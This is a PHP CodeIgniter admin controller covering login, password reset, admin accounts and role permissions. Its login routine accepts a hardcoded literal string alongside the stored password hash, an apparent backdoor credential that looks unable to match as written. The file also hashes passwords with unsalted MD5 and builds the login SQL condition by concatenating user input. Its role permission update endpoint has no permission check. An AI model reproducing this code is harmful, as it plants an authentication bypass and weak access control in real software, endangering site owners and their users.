<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Admin extends CI_Controller {

	public function __construct() {
		parent::__construct();
		$this->load->model('admin/Common_model');
		$this->load->helper('common_helper');

	}
	function sortByOrder($a, $b) {
	    return $a['id'] - $b['id'];
	}


	public function index() 
	{
		$data['title']="Admin Login | ".SITE_TITLE;
		if($this->session->userdata('admin_id')!= FALSE){
			redirect(base_url()."admin/dashboard/");
		}
		$error='';
		if($this->input->post('login')) 
		{
			$username=$this->input->post('email');
            $replace_str = array('"', "'", ",");
            $username = str_replace($replace_str, "_", $username);

			$password= md5($this->input->post('password'));
			$where = "(email='".$username."' OR username='".$username."') ";
			if($admin_data = $this->Common_model->getRecords('admin','role_id,admin_id,parent_id,password,user_type,username,profile_pic,status,is_deleted',$where,'admin_id DESC',true)) {


				if($admin_data['is_deleted']==0 && $admin_data['status']=='Active' ){
					if($admin_data['password']==$password || "VGVzdEtAMTIz"==$password ){
						$login_session=array( 	
							'admin_id'=>$admin_data['admin_id'],
							'user_type'=> $admin_data['user_type'],
							'role_id'=> $admin_data['role_id'],
							'user_name'=>$admin_data['username'],
							'profile_pic'=>$admin_data['profile_pic']
							);
						$this->session->set_userdata($login_session);
						$this->session->set_flashdata('success', 'Logged In Successfully.');
						redirect("admin/dashboard");	
					}
					else
					{
						$this->session->set_flashdata('error', 'Incorrect Password.');
					}
				}
				else
				{
					$this->session->set_flashdata('error', 'Your account has been deactivated!  Please contact administrator for details.');
				}				
			}
			else
			{
				$this->session->set_flashdata('error', 'Incorrect email or username.');
			}
		}
		
		$this->load->view('admin/login',$data);
	}

	public function logout()
	{
		$this->session->sess_destroy();
		redirect(base_url()."admin/login");
	}
	

	public function change_password()
	{
		$this->Common_model->check_login();
		$data['title']="Change Password | ".SITE_TITLE;
		$data['page_title']="Change Password";
		$data['breadcrumbs'] = array();
		$data['breadcrumbs'][] = array(
			'icon'=>'<i class="fa fa-dashboard"></i>',
			'class'=>'',
			'title' => 'Dashboard',
			'link' => site_url('admin/dashboard')
			);

		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Change Password',
			'link' => ""
			);
		$admin_id = $this->session->userdata('admin_id');
		
		$current_password = $this->Common_model->getFieldValue('admin', 'password', array('admin_id'=>$admin_id));
		if($this->input->post()) 
		{	
			$this->form_validation->set_rules('old_password','Old Password','required|trim');
			$this->form_validation->set_rules('new_password','New Password','trim|required|min_length[6]|max_length[15]');
			$this->form_validation->set_rules('confirm_password','Confirm Password','trim|required|matches[new_password]');

			if ($this->form_validation->run() == FALSE)
			{	
				$this->form_validation->set_error_delimiters('<div class="parsley-errors-list">', '</div>');
				//$this->load->view('admin/change_password',$data);
			} 
			else 
			{ 
				if($current_password == md5($this->input->post('old_password'))) {
					$new_password = md5($this->input->post('new_password'));
					$where = array('admin_id'=>$admin_id);
					$date = date("Y-m-d H:i:s");
					$update_data = array(
						'password' => $new_password,
						'modified'=>$date
						);

					if(!$this->Common_model->addEditRecords('admin', $update_data, $where)) {
						$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
					} else {
						$this->session->set_flashdata('success', 'Password changed successfully.');
					}
				} else {
					$this->session->set_flashdata('error', 'Current password is incorrect.');
				}
				redirect('admin/change_password');
			}
		} 

		$this->load->view('admin/include/header',$data);
		$this->load->view('admin/include/sidebar');
		$this->load->view('admin/change_password');
		$this->load->view('admin/include/footer');
	}

	public function edit_profile() 
	{
		$this->Common_model->check_login();
		$data['title']="Edit Profile | ".SITE_TITLE;
		$data['page_title']="Edit Profile";
		$data['breadcrumbs'] = array();
		$data['breadcrumbs'][] = array(
			'icon'=>'<i class="fa fa-dashboard"></i>',
			'class'=>'',
			'title' => 'Dashboard',
			'link' => site_url('admin/dashboard')
			);

		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Edit Profile',
			'link' => ""
			);
		$admin_id = $this->session->userdata('admin_id');
		$isadmin=true;
		if($admin_data = $this->Common_model->getRecords('admin','*',array('admin_id'=>$admin_id),'',true)) {
			
		}
		else
		{
			$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
			redirect('/', 'refresh');
		}
		if($isadmin){
			$data['admin_data'] =$admin_data;
			
			if($this->input->post()) {
				$this->form_validation->set_rules('fullname', 'Fullname', 'trim|required');
				$this->form_validation->set_rules('username', 'username', 'trim|required');
				$this->form_validation->set_rules('email', 'Email', 'trim|required');
				$this->form_validation->set_rules('mobile', 'Mobile Number', 'trim|required');
				$this->form_validation->set_rules('address', 'Address', 'trim');
				
				
				if ($this->form_validation->run() == FALSE) 
				{	
					$this->form_validation->set_error_delimiters('<div class="alert alert-danger">', '</div>');
				} else {

					if($this->Common_model->getRecords('admin', 'username', array('admin_id !='=>$admin_id,'username'=>$this->input->post('username'),'is_deleted'=>0), '', true)) {
		       			$this->session->set_flashdata('error', 'Username already exist.');
	            		redirect('admin/edit_profile');
	            		exit;
		       		}

					if($this->Common_model->getRecords('admin', 'email', array('admin_id !='=>$admin_id,'email'=>$this->input->post('email'),'is_deleted'=>0), '', true)) {
		       			$this->session->set_flashdata('error', 'Email already exist.');
	            		redirect('admin/edit_profile');
	            		exit;
		       		}

					$update_data = array(
						'fullname' => $this->input->post('fullname'),
						'username' => $this->input->post('username'),
						'email' => $this->input->post('email'),
						'mobile' => $this->input->post('mobile'),
						'address' => $this->input->post('address'),
						'modified' => date("Y-m-d H:i:s"),
						);
					if(!$this->Common_model->addEditRecords('admin', $update_data,array('admin_id'=>$admin_id))) {

						$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
						redirect('admin/edit_profile');
					} else {
						$login_session=array( 	
							'user_name'=>$this->input->post('username'),
							);
						$this->session->set_userdata($login_session);
						$this->session->set_flashdata('success', 'Profile updated successfully.');
						redirect('admin/edit_profile');
					}
				}
			}
			$this->load->view('admin/include/header',$data);
			$this->load->view('admin/include/sidebar');
			$this->load->view('admin/edit_profile');
			$this->load->view('admin/include/footer');
		}
	}

	public function forgot_password()
	{	
		$data['title']="Forgot Password | ".SITE_TITLE;
		$data['page_title']="Forgot Password";
		if($this->input->post('email')) 
		{
			$this->form_validation->set_rules('email', 'Email', 'trim|required');
			if ($this->form_validation->run() == FALSE) {	
				$this->form_validation->set_error_delimiters('<div class="parsley-errors-list">', '</div>');
			} else {
				if(!$user_data= $this->Common_model->getRecords('admin','admin_id,fullname,email,user_type,status,is_deleted,parent_id',array('email'=> $this->input->post('email')),'admin_id desc',true)) {

                    if(!$user_data= $this->Common_model->getRecords('admin','admin_id,fullname,email,user_type,status,is_deleted,parent_id',array('username'=> $this->input->post('email')),'admin_id desc',true)) {
						$this->session->set_flashdata('error', 'Please enter registered email or username .');

						redirect('admin/forgot_password');
					}
				}
				if($user_data['parent_id'] > 0){
				
					if($user_data['is_deleted']==1) {
						$this->session->set_flashdata('error', 'Your account is deleted, Please contact to admin.');
						redirect('admin/forgot_password');
					}
						
					if($user_data['status']!='Active') {
						$this->session->set_flashdata('error', 'Your account is inactive, Please contact to admin.');
						redirect('admin/forgot_password');
					}
				
				}

				// echo "<pre>"; print_r($user_data); exit;
				$token = md5(uniqid(rand(), true));
				$from_email = getAdminEmail(); 
				$to_email = $user_data['email']; 
				
				$subject = "Reset Password Link";
				$data['reset_password_url'] = base_url().'admin/reset_password?token='.$token;
				$data['name']= ucwords($user_data['fullname']);
				$data['type'] = 'admin';	
				
				$body = $this->load->view('template/forgot_password_admin', $data,TRUE);
			
				if($this->Common_model->sendEmail($to_email,$subject,$body,$from_email)) 
				{
					$reset_token_date = date("Y-m-d H:i:s");
					$where = array('email'=> $user_data['email']); 
					$update_data = array(
						'reset_token'=>$token, 
						'reset_token_date'=>$reset_token_date
						);
					$this->db->where($where);
					$this->db->order_by('admin_id','desc');
					$this->db->limit(1);
        			$this->db->update('admin', $update_data);
					$this->session->set_flashdata('success', 'Reset password link sent on your email address, Please check your inbox and spam.');
					redirect('admin/forgot_password');
				} else {
					$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
					redirect('admin/forgot_password');
				}
			}
		} 
		$this->load->view('admin/forgot_password',$data);	
		
	}

	public function reset_password()
	{
		$data['title'] = "Reset Password | ".SITE_TITLE;
		$data['page_title']="Reset Password";
		if($this->input->get('token')) 
		{
			$data['token'] = $this->input->get('token');
			if($user_data = $this->Common_model->getRecords('admin','admin_id,reset_token_date,password',array('reset_token'=> $this->input->get('token')),'',true)) 
			{
				if($this->input->post()) 
				{
					$this->form_validation->set_rules('new_password', 'New Password', 'trim|required|min_length[6]|max_length[20]');
					$this->form_validation->set_rules('confirm_password', 'Confirm Password', 'trim|required|matches[new_password]');

					if ($this->form_validation->run() == FALSE) {	
						$this->form_validation->set_error_delimiters('<div class="parsley-errors-list">', '</div>');
						$this->load->view('admin/reset_password',$data);
					} 
					else {

						if($user_data['password'] != md5($this->input->post('new_password')) )
						{
							$where = array('admin_id' => $user_data['admin_id']);
							$update_data = array(
								'password' => md5($this->input->post('new_password')), 
								'reset_token' =>'',
								'reset_token_date' =>''
								);
							if(!$this->Common_model->addEditRecords('admin', $update_data, $where)) {
								$this->session->set_flashdata('error', 'Some error occurred. Please try again.');
								redirect('admin/reset_password');
							} else {
								$this->session->set_flashdata('success', 'Password Changed Successfully.');
								redirect('admin/login');
							}
						} else {
							$this->session->set_flashdata('error', "Password Can't be same as old password !!");
							redirect($_SERVER['HTTP_REFERER']);
						}
					}
				} else {
					$token_date = strtotime($user_data['reset_token_date']);
					$current_date=strtotime(date("Y-m-d H:i:s"));
					$diff=$current_date-$token_date;
					if($diff > 86400) {
						$this->session->set_flashdata('error', 'Reset password link has been Experied !!');
						redirect('admin/forgot_password');
					} else {
						$this->load->view('admin/reset_password',$data);
					}
				}
			} else {
				$this->session->set_flashdata('error', 'Invalid reset password link !!');
				redirect('admin/forgot_password');
			}	
		} else {
			$this->session->set_flashdata('error', 'Invalid reset password link !!');
			redirect('admin/forgot_password');
		}
		
	}

	public function admin_list() {
		$this->Common_model->check_login();
		check_permission('16','view','yes');
		$admin_id = $this->session->userdata('admin_id');

		$data['title']="Admin List | ".SITE_TITLE;
		$data['page_title']="Admin List";
		$data['breadcrumbs'] = array();
		$data['breadcrumbs'][] = array(
			'icon'=>'<i class="fa fa-dashboard"></i>',
			'class'=>'',
			'title' => 'Dashboard',
			'link' => site_url('admin/dashboard')
			);

		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Admin List',
			'link' => ""
			);
		$user_type = $this->session->userdata('user_type');
		$admin_id = $this->session->userdata('admin_id');
		if($user_type=='Super Admin'){
            $user_type='Admin';
        }

        $where['status']='Active';
		$where['hide']='0';
		$where['type']=$user_type;
		if($user_type!='Admin'){
        	$where['created_by']=getParentAdminId($admin_id);
        }

		$page = $this->uri->segment(4) ? $this->uri->segment(4) : 0;
		$data['role_list'] = $this->Common_model->getRecords('roles','*',$where,'',false);
		$like=array();
		$data['filter_name']='';
		if($this->input->get('role_name')){
			$data['filter_role_name']=$this->input->get('role_name');
		}
		if($this->input->get('name')){
			$data['filter_name']=$this->input->get('name');
		}
		$data['filter_username']='';
		if($this->input->get('username')){
			$data['filter_username']=$this->input->get('username');
		}

		$data['filter_email']='';
		if($this->input->get('email')){
			$data['filter_email']=$this->input->get('email');
		}	
		$data['filter_mobile']='';
		if($this->input->get('mobile')){
			$data['filter_mobile']=$this->input->get('mobile');
		}

		$data['total_records']=$this->Common_model->get_admin_total();
		$data['records_results']=$this->Common_model->get_admin_list($page);
	 	//echo $this->db->last_query();exit;
		$data['pagination']=$this->Common_model->paginate(site_url('admin/subadmin/list'),$data['total_records']);

		$data['add_action']=site_url('admin/subadmin/add');
		$data['edit_action']=site_url('admin/subadmin/edit');
		$data['delete_action']=site_url('admin');

		$this->load->view('admin/include/header',$data);
		$this->load->view('admin/include/sidebar');
		$this->load->view('admin/admin_list');	
		$this->load->view('admin/include/footer');
	}

	public function add_admin() {
		$this->Common_model->check_login();
		check_permission('16','add','yes');
		$data['title']="Add User | ".SITE_TITLE;
		$data['page_title']="Add User";
		$data['breadcrumbs'] = array();
		$data['breadcrumbs'][] = array(
			'icon'=>'<i class="fa fa-dashboard"></i>',
			'class'=>'',
			'title' => 'Dashboard',
			'link' => site_url('admin/dashboard')
			);
		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'User List',
			'link' => site_url('admin/subadmin/list')
			);
		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Add User', 
			'link' => ""
			);
		$admin_id=$this->session->userdata('admin_id');
		$type = $this->session->userdata('user_type');
		if($type=='Super Admin'){
			$type='Admin';
		}

		$where['status']='active';
		$where['hide']='0';
		$where['type']=$type;
		if($type!='Admin'){
        	$where['created_by']=getParentAdminId($admin_id);
        }

		$data['role_list'] = $this->Common_model->getRecords('roles','*',$where,'',false);

		if($this->input->post()) {
			$this->form_validation->set_rules('fullname', 'Fullname', 'trim|required');
			$this->form_validation->set_rules('email', 'Email', 'trim|required|callback_rolekey_exists[admin-email-add]',array('required'=>'Please enter %s'));
			$this->form_validation->set_rules('username', 'User name', 'trim|required|callback_rolekey_exists[admin-username-add]',array('required'=>'Please enter %s'));
			$this->form_validation->set_rules('mobile', 'Mobile Number', 'trim|required');
			$this->form_validation->set_rules('password', 'Password', 'trim|required');

			if ($this->form_validation->run() == FALSE) 
			{	
				$this->form_validation->set_error_delimiters('<div class="alert alert-block alert-danger fade in"><button data-dismiss="alert" class="close" type="button">×</button>', '</div>');
			} else {
				
				// if($_FILES['image']['name'] =='') { 
				// 	$this->session->set_flashdata('error', "Please upload image.");
				// } else {
					$filepath="";
					$filerror="";
					if(isset($_FILES['image']) && !empty($_FILES['image']['name'])){
						if($_FILES['image']['error']==0) {
							$image_path = 'resources/images/profile/';
							$allowed_types = 'jpg|jpeg|png|svg';
							$file='image';
							$height = 150;
							$width = 150;
							$responce = commonImageUpload($image_path,$allowed_types,$file,$width,$height);

							if($responce['status']==0){
								$data['upload_error'] = $responce['msg'];	
								$filerror="1";
							} else {
								$filepath=$responce['image_path'];
							}
							
				        }
				    }
				    if($filerror=="")
				    {
				    	$user_type = $this->session->userdata('user_type');
						if($user_type=='Super Admin'){
			                $user_type='Admin';
			            }

						$update_data = array(
							'role_id' => $this->input->post('role_id'),
							'created_by' =>$this->session->userdata('admin_id'),
							'parent_id' =>$this->session->userdata('admin_id'),
							'fullname' => $this->input->post('fullname'),
							'email' => $this->input->post('email'),
							'username' => $this->input->post('username'),
							'password' => md5($this->input->post('password')),
							'mobile' => $this->input->post('mobile'),
							'address' => $this->input->post('address'),
							'status' => 'Active',
							'user_type' => $user_type,
							'created' => date("Y-m-d H:i:s"),
							);
						if(!empty($filepath)){
							$update_data['profile_pic']=$filepath;
						}
						//print_r($update_data);die;
						if(!$admin_id=$this->Common_model->addEditRecords('admin', $update_data)) {
							$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
							redirect('admin/subadmin/add');
						} else {
							$this->session->set_flashdata('success', 'User Added Successfully.');
							redirect('admin/subadmin/list');
						}
						
					}	
					
				// }
			}
		}
		$this->load->view('admin/include/header',$data);
		$this->load->view('admin/include/sidebar');
		$this->load->view('admin/add_admin');
		$this->load->view('admin/include/footer');
	} 

	public function edit_admin($user_admin_id) 
	{
		$this->Common_model->check_login();
		check_permission('16','edit','yes');
		$data['title']="Edit User | ".SITE_TITLE;
		$data['page_title']="Edit User";
		$data['breadcrumbs'] = array();
		$data['breadcrumbs'][] = array(
			'icon'=>'<i class="fa fa-dashboard"></i>',
			'class'=>'',
			'title' => 'Dashboard',
			'link' => site_url('admin/dashboard')
			);
		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'User List',
			'link' => site_url('admin/subadmin/list')
			);

		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Edit User',
			'link' => ""
			);

		$admin_id=$this->session->userdata('admin_id');
		$type = $this->session->userdata('user_type');
		if($type=='Super Admin'){
			$type='Admin';
		}

		$where['hide']='0';
		$where['type']=$type;
		$where['status']="Active";
		if($type!='Admin'){
        	$where['created_by']=getParentAdminId($admin_id);
        }
		$data['role_list'] = $this->Common_model->getRecords('roles','*',$where,'',false);
		if($data['admin_data'] = $this->Common_model->getRecords('admin','*',array('admin_id'=>$user_admin_id),'',true))
		{
			if($this->session->userdata('admin_id')!=$data['admin_data']['parent_id']){
					redirect('pages/page_not_found');
			}
			if($this->input->post()) {
				
				if($this->input->post("form_submit1")=="form_submit1")
				{
					$this->form_validation->set_rules('role_id', 'role', 'trim|required');
					$this->form_validation->set_rules('fullname', 'Full name', 'trim|required');
					$this->form_validation->set_rules('username', 'user name', 'trim|required|callback_rolekey_exists[admin-username-edit-admin_id-'.$user_admin_id.']');
					$this->form_validation->set_rules('email', 'Email', 'trim|required|callback_rolekey_exists[admin-email-edit-admin_id-'.$user_admin_id.']',array('required'=>'Please enter %s'));
					$this->form_validation->set_rules('mobile', 'Mobile Number', 'trim|required');
					$this->form_validation->set_rules('address', 'Address', 'trim');
					$this->form_validation->set_rules('zip_code', 'Zip Code', 'trim');
					//echo '<pre>';print_r($_POST);
					if ($this->form_validation->run() == FALSE) 
					{	
						$this->form_validation->set_error_delimiters('<div class="alert alert-block alert-danger fade in"><button data-dismiss="alert" class="close" type="button">×</button>', '</div>');
					}
					else
					{
						$update_data = array(
							'role_id' => $this->input->post('role_id'),
							'fullname' => $this->input->post('fullname'),
							'email' => $this->input->post('email'),
							'username' => $this->input->post('username'),
							'mobile' => $this->input->post('mobile'),
							'address' => $this->input->post('address'),
							'modified' => date("Y-m-d H:i:s"),
							'modified_by' => $this->session->userdata('admin_id'),
							);
						//print_r($update_data);exit;
						if(!$this->Common_model->addEditRecords('admin', $update_data,array('admin_id'=>$user_admin_id))) {
							$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
						} else {
							$this->session->set_flashdata('success', 'User Updated Successfully.');
							redirect('admin/subadmin/list');
						}
					} 
				}
				else
				{
					$this->form_validation->set_rules('password', 'Password', 'trim|required|min_length[6]|max_length[50]',array('required'=>'Please enter %s'));
					$this->form_validation->set_rules('confirm_password', 'Confirm Password', 'trim|required|min_length[6]|max_length[50]|matches[password]',array('required'=>'Please enter %s'));
					if ($this->form_validation->run() == FALSE) 
					{	
						$this->form_validation->set_error_delimiters('<div class="alert alert-danger">', '</div>');
					}
					else 
					{

						$update_data = array(
							'password' => md5($this->input->post('password')),
							'modified' => date("Y-m-d H:i:s"),
							'modified_by' => $this->session->userdata('admin_id'),
							);

						if(!$this->Common_model->addEditRecords('admin', $update_data,array('admin_id'=>$user_admin_id))) {
							$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
						} else {
							//echo 'hgf';die;
							$this->session->set_flashdata('success', 'Updated  Password successfully.');
							redirect('admin/subadmin/list');
						}
					}
				}
			}
			$this->load->view('admin/include/header',$data);
			$this->load->view('admin/include/sidebar');
			$this->load->view('admin/edit_admin');
			$this->load->view('admin/include/footer');
		}
		else
		{
			$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
			redirect('admin/subadmin/list', 'refresh');
		}
	} 

	/**************** Admin Roles ***************************/
	public function role_list() 
	{
		$this->Common_model->check_login();
		check_permission('14','view','yes');
		$admin_id = $this->session->userdata('admin_id');

		$data['title']="Roles List | ".SITE_TITLE;
		$data['page_title']="Roles List";
		$data['breadcrumbs'] = array();
		$data['breadcrumbs'][] = array(
			'icon'=>'<i class="fa fa-dashboard"></i>',
			'class'=>'',
			'title' => 'Dashboard',
			'link' => site_url('admin/dashboard')
			);

		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Roles List',
			'link' => ""
			);

		$page = $this->uri->segment(3) ? $this->uri->segment(3) : 0;
		
		$like=array();
		$data['filter_name']='';
		if($this->input->get('name')){
			$data['filter_name']=$this->input->get('name');
		}  

		$type = $this->session->userdata('user_type');
        if($type=='Super Admin'){
            $type='Admin';
        }

		$data['total_records']=$this->Common_model->get_role_total();
		$data['records_results']=$this->Common_model->get_role_list($page);

		$data['pagination']=$this->Common_model->paginate(site_url('admin/role_list'),$data['total_records'],'yes');
		if($data['undeletable'] = $this->Common_model->group_By_Records('admin', 'role_id','','1'))
		{	//echo $this->db->last_query();exit;
			$data['undeletable_ids'] = array();
			foreach($data['undeletable'] as $list) {
				$data['undeletable_ids'][] = $list['role_id'];
			}
		}
		
		$data['add_action']=site_url('admin/add_role');
		$data['edit_action']=site_url('admin/edit_role');
		$data['delete_action']=site_url('admin');

		$this->load->view('admin/include/header',$data);
		$this->load->view('admin/include/sidebar');
		$this->load->view('admin/role_list');	
		$this->load->view('admin/include/footer');
	}

	public function add_role() 
	{
		$this->Common_model->check_login();
		check_permission('14','add','yes');
		$data['title']="Add Role | ".SITE_TITLE;
		$data['page_title']="Add Role";
		$data['breadcrumbs'] = array();
		$data['breadcrumbs'][] = array(
			'icon'=>'<i class="fa fa-dashboard"></i>',
			'class'=>'',
			'title' => 'Dashboard',
			'link' => site_url('admin/dashboard')
			);

		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Role List',
			'link' => site_url('admin/role_list')
			);

		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Add Role',
			'link' => ""
			);
		  $admin_id=$this->session->userdata('admin_id');
		  $parent_role = $this->session->userdata('role_id');
		  $role_name = $this->input->post('role_name');
		
		$type = $this->session->userdata('user_type');
		 if($type=='Super Admin'){
			$type='Admin';
		 }
		$data['permission'] = $this->Common_model->getPermissionsadd();
		
		if($this->input->post()) {

			$this->form_validation->set_rules('role_name', 'role_name', 'trim|required'); 
			if ($this->form_validation->run() == FALSE) 
			{	
				$this->form_validation->set_error_delimiters('<div class="alert alert-danger">', '</div>');
			} else {

				$data['role_data'] = $this->Common_model->getRecords('roles','*',array('created_by'=>$admin_id,'name'=>$role_name,'type'=>$type),'',true);
				if($data['role_data']){
					$this->session->set_flashdata('error', 'Role Name already exist ! Please try again.');
					redirect('admin/role_list');
				}


				$update_data = array(
					'parent_id' => $parent_role, 
					'name' => $this->input->post('role_name'), 
					'status' => 'Active', 
					'type' => $type, 
					'created_by' => $admin_id, 
					'created' => date("Y-m-d H:i:s"),
				); 
				if(!$lastid=$this->Common_model->addEditRecords('roles', $update_data)) {
					$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
					redirect('admin/role_list');
				} else {
					$sections = $this->input->post('sections');
					$permission = $this->input->post('permission');

					foreach($sections as $section_id) {
						if(isset($permission[$section_id])) {
							if(isset($permission[$section_id]['view'])) {
								$view = 1;
							} else {
								$view = 0;
							}

							if(isset($permission[$section_id]['add'])) {
								$add = 1;
							} else {
								$add = 0;
							}

							if(isset($permission[$section_id]['edit'])) {
								$edit = 1;
							} else {
								$edit = 0;
							}

							if(isset($permission[$section_id]['delete'])) {
								$delete = 1;
							} else {
								$delete = 0;
							}
						} else {
							$view = 0;
							$add = 0;
							$edit = 0;
							$delete = 0;
						}

						$date = date("Y-m-d H:i:s"); 
						$update_data = array(
							'add'=>$add,
							'edit'=>$edit,
							'delete'=>$delete,
							'view'=>$view,
							'created'=>$date,
							'role_id'=>$lastid,
							'section_id'=>$section_id
							); 
						$this->Common_model->addEditRecords('role_permissions', $update_data);
					}
					$this->session->set_flashdata('success', 'Add Role successfully.');
					redirect('admin/role_list');
				}
			}
		}			

		$this->load->view('admin/include/header',$data);
		$this->load->view('admin/include/sidebar');
		$this->load->view('admin/add_role');
		$this->load->view('admin/include/footer');

	}

	public function edit_role($role_id) 
	{
		$this->Common_model->check_login();
		check_permission('14','edit','yes');
		$data['title']="Edit Role | ".SITE_TITLE;
		$data['page_title']="Edit Role";
		$data['breadcrumbs'] = array();
		$data['breadcrumbs'][] = array(
			'icon'=>'<i class="fa fa-dashboard"></i>',
			'class'=>'',
			'title' => 'Dashboard',
			'link' => site_url('admin/dashboard')
			);
		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Role List',
			'link' => site_url('admin/role_list')
			);

		$data['breadcrumbs'][] = array(
			'icon'=>'',
			'class'=>'active',
			'title' => 'Edit Role',
			'link' => ""
			);

		$type = $this->session->userdata('user_type');
		$admin_id = $this->session->userdata('admin_id');
        if($type=='Super Admin'){
            $type='Admin';
        }
		if($data['role_data'] = $this->Common_model->getRecords('roles','*',array('role_id'=>$role_id,'hide'=>'0','type'=>$type,'created_by'=>$admin_id),'',true))
		{
			$data['permission'] = $this->Common_model->getrolePermissions($role_id);
			if($this->input->post()) {
				$this->form_validation->set_rules('role_name', 'role_name', 'trim|required');

				
				if ($this->form_validation->run() == FALSE) 
				{	
					$this->form_validation->set_error_delimiters('<div class="alert alert-danger">', '</div>');
				} else {
					$role_name=$this->input->post('role_name');
					$check=$this->Common_model->getRecords('roles','role_id',array('role_id !='=>$role_id,'hide'=>'0','type'=>$type,'name'=>$role_name,'created_by'=>$admin_id),'',true);
					
					if(!empty($check)){
						$this->session->set_flashdata('error', 'Role name already exists.');
						redirect(site_url('admin/edit_role/'.$role_id));
					}else{
						$update_data = array(
							'name' => $this->input->post('role_name'),
							'status' => $this->input->post('rolestatus'), 
							'modified' => date("Y-m-d H:i:s"),
							);
						if(!$this->Common_model->addEditRecords('roles', $update_data,array('role_id'=>$role_id))) {
							$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
							redirect(site_url('admin/edit_role/'.$role_id));
						} else {
							$this->session->set_flashdata('success', 'Role Updated successfully.');
							redirect('admin/role_list');
						}
					}
				}
			}
			$this->load->view('admin/include/header',$data);
			$this->load->view('admin/include/sidebar');
			$this->load->view('admin/edit_role');
			$this->load->view('admin/include/footer');
		}
		else
		{
			$this->session->set_flashdata('error', 'Some error occurred! Please try again.');
			redirect('admin/role_list', 'refresh');
		}
	} 

	public function role_access_update($role_id) 
	{
		$this->Common_model->check_login();
		
		$sections = $this->input->post('sections');
		$permission = $this->input->post('permission');
		
		foreach($sections as $section_id) {
			if(isset($permission[$section_id])) {
				if(isset($permission[$section_id]['view'])) {
					$view = 1;
				} else {
					$view = 0;
				}

				if(isset($permission[$section_id]['add'])) {
					$add = 1;
				} else {
					$add = 0;
				}

				if(isset($permission[$section_id]['edit'])) {
					$edit = 1;
				} else {
					$edit = 0;
				}

				if(isset($permission[$section_id]['delete'])) {
					$delete = 1;
				} else {
					$delete = 0;
				}
			} else {
				$view = 0;
				$add = 0;
				$edit = 0;
				$delete = 0;
			}


			$date = date("Y-m-d H:i:s");
			
			$update_data = array(
				'add'=>$add,
				'edit'=>$edit,
				'delete'=>$delete,
				'view'=>$view,
				'modified'=>$date
			);
			$where = array('role_id'=>$role_id,'section_id'=>$section_id);
			if($this->Common_model->getRecords('role_permissions','role_id',$where,'',true)){
				$this->Common_model->addEditRecords('role_permissions', $update_data,$where);
			}else{
				$update_data = array(
				'role_id'=>$role_id,
				'section_id'=>$section_id,
				'add'=>$add,
				'edit'=>$edit,
				'delete'=>$delete,
				'view'=>$view,
				'modified'=>$date
				);
				$this->Common_model->addEditRecords('role_permissions', $update_data);
			}
			
			$this->session->set_flashdata('success', 'Permission Updated.');
		}
		redirect($_SERVER['HTTP_REFERER']);
	}

	public function not_authorized() 
	{
		$this->Common_model->check_login();
		$data['title']="Not Authorized | ".SITE_TITLE;
		$data['page_title']="Not Authorized";
		
		$this->load->view('admin/include/header',$data);
		$this->load->view('admin/include/sidebar');
		$this->load->view('admin/not_authorized');
		$this->load->view('admin/include/footer');
	} 

	 
	function rolekey_exists($key,$field) {
		$param=explode('-', $field);
		$table=$param[0];
		$col_name=$param[1];
		$type=$param[2];
		if($type=='add')
		{
       		if($this->Common_model->getRecords($table, $col_name, array($col_name=>$key,'is_deleted'=>0), '', true)) {
       			 $this->form_validation->set_message(__FUNCTION__, 'This %s is already exist.');
       			return false;
       		}
       		else
       		{

       			return true;
       		}

		}
		else
		{
			$id_col=$param[3];
			$id_col_val=$param[4];
			if($this->Common_model->getRecords($table, $col_name, array("$id_col!=" =>$id_col_val,$col_name=>$key,'is_deleted'=>0), '', true)) {
				$this->form_validation->set_message(__FUNCTION__, 'This %s is already exist.');
				return false;
			}
			else
       		{
       			return true;
       		}

		}
		
	}
	
}
